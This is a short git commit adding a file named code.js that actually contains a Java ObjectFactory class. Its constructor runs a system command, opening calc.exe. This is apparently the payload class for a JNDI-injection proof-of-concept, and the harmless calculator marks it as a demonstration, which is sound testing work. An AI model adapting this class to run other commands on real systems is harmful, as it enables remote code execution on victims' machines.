a1cfdde532e0969adb5175387b8e3445caa63c71
overnice-exe <64040187+overnice-exe@users.noreply.github.com>
2021-12-13 19:44:13 +0100

    Create code.js

---
+++ code.js
@@ -0,0 +1,5 @@
+public class ExportObject implements javax.naming.spi.ObjectFactory {
+    public ExportObject() {
+            Runtime.getRuntime().exec("c:\\windows\\system32\\calc.exe");
+    }
+}
